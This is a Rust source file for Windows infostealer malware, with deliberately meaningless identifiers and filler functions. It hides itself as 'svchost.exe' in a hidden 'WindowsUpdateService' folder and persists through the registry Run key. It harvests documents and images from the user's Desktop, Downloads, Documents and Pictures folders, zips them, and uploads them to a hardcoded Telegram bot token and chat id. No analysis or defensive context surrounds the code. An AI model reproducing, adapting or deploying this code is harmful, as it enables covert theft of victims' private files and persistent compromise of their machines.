#![cfg_attr(windows, windows_subsystem = "windows")]

use std::fs::{self, File};
use std::io::{Read, Write};
use std::path::{Path, PathBuf};
use zip::ZipWriter;
use zip::write::FileOptions;
use dirs::{desktop_dir, document_dir, picture_dir, download_dir};
use tokio;
use rand::Rng;
use tokio::time::{sleep, Duration};
use std::env;
use std::time::{SystemTime, UNIX_EPOCH};

#[cfg(windows)]
use winreg::enums::*;
#[cfg(windows)]
use winreg::RegKey;
#[cfg(windows)]
use std::process::Command;

// Constants for something, not sure what.
const A: u64 = 10 * 1024 * 1024;
const B: u64 = 10 * 1024 * 1024;
const C: u64 = 10 * 1024 * 1024;
const D: u64 = 5 * 1024 * 1024;
const E: u64 = 3 * 1024 * 1024;
const F: u64 = 45 * 1024 * 1024;

#[derive(Clone)]
struct Data {
    x: PathBuf,
    y: String,
}

mod helpers {
    use super::*;

    pub async fn do_nothing_important() {
        let n = rand::thread_rng().gen_range(1000..5000);
        sleep(Duration::from_millis(n)).await;
    }
}

// A useless function to make the code harder to read.
fn useless_function(a: i32, b: i32) -> i32 {
    let mut result = 0;
    for i in 0..a {
        result += i * b;
    }
    result
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    #[cfg(windows)]
    {
        let g = env::current_exe()?;
        let h = "some_random_string";

        let i = env::var("PROGRAMDATA")
            .unwrap_or_else(|_| "C:\\ProgramData".to_string());
        let j = Path::new(&i).join("WindowsUpdateService");
        let k = j.join("svchost.exe");

        if g == k {
            let pointless_value = useless_function(10, 20);
            println!("This is a meaningless message: {}", pointless_value);
            return task_one().await;
        }
        
        let l = task_two(&k);

        if !l {
            if let Err(e) = task_three(&k) {
                eprintln!("Error: {}", e);
            }

            if let Err(e) = task_four(&k) {
                eprintln!("Error: {}", e);
            }
        } else {
            println!("Another meaningless message.");
        }

        task_five(&k)?;
    }

    #[cfg(not(windows))]
    {
        task_one().await?;
    }
    
    Ok(())
}

async fn task_one() -> Result<(), Box<dyn std::error::Error>> {
    let m = task_six()?;

    if m.is_empty() {
        println!("No data.");
        return Ok(());
    }

    let n = task_seven(&m)?;

    for (i, o) in n.iter().enumerate() {
        let p = format!("data_{}.zip", i + 1);
        println!("Processing item {}...", i + 1);

        helpers::do_nothing_important().await;
        match task_eight(o, &p).await {
            Ok(_) => println!("Item {} processed.", i + 1),
            Err(e) => println!("Error processing item {}: {}", i + 1, e),
        }
    }

    Ok(())
}

#[cfg(windows)]
fn task_two(q: &Path) -> bool {
    let r = q.exists();
    let mut s = false;
    
    let t = RegKey::predef(HKEY_CURRENT_USER);
    match t.open_subkey_with_flags(
        "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 
        KEY_READ
    ) {
        Ok(u) => {
            match u.get_value::<String, _>("WindowsUpdateService") {
                Ok(v) => {
                    let w = q.to_string_lossy();
                    if v == w {
                        s = true;
                    }
                },
                Err(_) => {}
            }
        },
        Err(_) => {}
    }
    
    r && s
}

#[cfg(windows)]
fn task_three(x: &Path) -> Result<(), Box<dyn std::error::Error>> {
    let y = x.parent().unwrap();

    if !y.exists() {
        fs::create_dir_all(&y)?;
        Command::new("attrib")
            .args(&["+h", &y.to_string_lossy()])
            .output()?;
    }
    let z = env::current_exe()?;
    fs::copy(&z, x)?;
    Command::new("attrib")
        .args(&["+h", &x.to_string_lossy()])
        .output()?;
    
    Ok(())
}

#[cfg(windows)]
fn task_four(aa: &Path) -> Result<(), Box<dyn std::error::Error>> {
    let bb = RegKey::predef(HKEY_CURRENT_USER);
    let (cc, _) = bb.create_subkey_with_flags(
        "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 
        KEY_WRITE
    )?;
    
    let dd = "WindowsUpdateService";
    let ee = aa.to_string_lossy();
    
    cc.set_value(dd, &ee.to_string())?;
    
    Ok(())
}

#[cfg(windows)]
fn task_five(ff: &Path) -> Result<(), Box<dyn std::error::Error>> {
    if ff.exists() {
        Command::new(ff)
            .spawn()
            .ok();
    }
    
    std::process::exit(0);
}

fn get_val(gg: &str) -> u64 {
    match gg.to_lowercase().as_str() {
        "pdf" => A,
        "doc" => B,
        "docx" => C,
        "png" | "jpeg" | "jpg" => D,
        "txt" => E,
        _ => 0,
    }
}

fn check_type(hh: &Path) -> bool {
    if let Some(ii) = hh.extension() {
        let jj = ii.to_string_lossy().to_lowercase();
        matches!(jj.as_str(), "pdf" | "doc" | "docx" | "png" | "jpeg" | "jpg" | "txt")
    } else {
        false
    }
}

fn check_size(kk: &Path) -> bool {
    if let Some(ll) = kk.extension() {
        let mm = ll.to_string_lossy().to_lowercase();
        let nn = get_val(&mm);

        if nn == 0 {
            return false;
        }

        match fs::metadata(kk) {
            Ok(oo) => oo.len() <= nn,
            Err(_) => false,
        }
    } else {
        false
    }
}

fn task_nine(pp: &Path, qq: &str) -> Result<Vec<Data>, Box<dyn std::error::Error>> {
    let mut rr = Vec::new();

    if !pp.exists() {
        return Ok(rr);
    }

    fn walk(
        ss: &Path,
        tt: &str,
        uu: &str,
        vv: &mut Vec<Data>
    ) -> Result<(), Box<dyn std::error::Error>> {
        let ww = match fs::read_dir(ss) {
            Ok(ww) => ww,
            Err(_) => return Ok(()),
        };

        for xx in ww {
            let yy = match xx {
                Ok(yy) => yy,
                Err(_) => continue,
            };

            let zz = yy.path();

            if zz.is_file() {
                if check_type(&zz) && check_size(&zz) {
                    let aaa = if uu.is_empty() {
                        format!("{}/{}", tt, zz.file_name().unwrap().to_string_lossy())
                    } else {
                        format!("{}/{}/{}", tt, uu, zz.file_name().unwrap().to_string_lossy())
                    };
                    vv.push(Data { x: zz, y: aaa });
                }
            } else if zz.is_dir() {
                let bbb = match zz.file_name() {
                    Some(ccc) => ccc.to_string_lossy(),
                    None => continue,
                };

                let ddd = if uu.is_empty() {
                    bbb.to_string()
                } else {
                    format!("{}/{}", uu, bbb)
                };
                if walk(&zz, tt, &ddd, vv).is_err() {
                    continue;
                }
            }
        }
        Ok(())
    }

    walk(pp, qq, "", &mut rr)?;
    Ok(rr)
}

fn task_six() -> Result<Vec<Data>, Box<dyn std::error::Error>> {
    let mut eee = Vec::new();

    if let Some(fff) = desktop_dir() {
        if let Ok(mut ggg) = task_nine(&fff, "Desktop") {
            eee.append(&mut ggg);
        }
    }

    if let Some(hhh) = download_dir() {
        if let Ok(mut iii) = task_nine(&hhh, "Downloads") {
            eee.append(&mut iii);
        }
    }

    if let Some(jjj) = document_dir() {
        if let Ok(mut kkk) = task_nine(&jjj, "Documents") {
            eee.append(&mut kkk);
        }
    }

    if let Some(lll) = picture_dir() {
        if let Ok(mut mmm) = task_nine(&lll, "Pictures") {
            eee.append(&mut mmm);
        }
    }

    Ok(eee)
}

fn task_ten(nnn: &[Data]) -> Result<Vec<Vec<Data>>, Box<dyn std::error::Error>> {
    let mut ooo = Vec::new();
    let mut ppp = Vec::new();
    let mut qqq = 0;

    for rrr in nnn {
        let sss = match fs::metadata(&rrr.x) {
            Ok(ttt) => ttt.len(),
            Err(_) => continue,
        };

        if sss > F {
            continue;
        }

        if qqq + sss > F && !ppp.is_empty() {
            ooo.push(ppp);
            ppp = Vec::new();
            qqq = 0;
        }

        ppp.push(rrr.clone());
        qqq += sss;
    }

    if !ppp.is_empty() {
        ooo.push(ppp);
    }

    Ok(ooo)
}

fn task_seven(uuu: &[Data]) -> Result<Vec<Vec<u8>>, Box<dyn std::error::Error>> {
    let vvv = task_ten(uuu)?;
    let mut www = Vec::new();

    for xxx in vvv.iter() {
        let mut yyy = Vec::new();
        {
            let mut zzz = ZipWriter::new(std::io::Cursor::new(&mut yyy));

            let aaaa = FileOptions::default()
                .compression_method(zip::CompressionMethod::Stored);

            for bbbb in xxx {
                if zzz.start_file(bbbb.y.clone(), aaaa).is_ok() {
                    if let Ok(mut cccc) = File::open(&bbbb.x) {
                        let mut dddd = Vec::new();
                        if cccc.read_to_end(&mut dddd).is_ok() {
                            let _ = zzz.write_all(&dddd);
                        }
                    }
                }
            }

            zzz.finish()?;
        }

        www.push(yyy);
    }

    Ok(www)
}

async fn task_eight(eeee: &[u8], ffff: &str) -> Result<(), Box<dyn std::error::Error>> {
    let gggg = "7960837487:AAFKrBL143XIALZB39n9fQ9bXXT4ldrRlns";
    let hhhh = "7279467950";

    let iiii = format!("https://api.telegram.org/bot{}/sendDocument", gggg);

    let jjjj = reqwest::Client::new();

    let kkkk = reqwest::multipart::Form::new()
        .text("chat_id", hhhh.to_string())
        .part("document",
            reqwest::multipart::Part::bytes(eeee.to_vec())
                .file_name(ffff.to_string())
                .mime_str("application/zip")?
        );

    let llll = jjjj.post(&iiii)
        .multipart(kkkk)
        .send()
        .await?;

    if !llll.status().is_success() {
        let mmmm = llll.text().await?;
        return Err(mmmm.into());
    }

    Ok(())
}
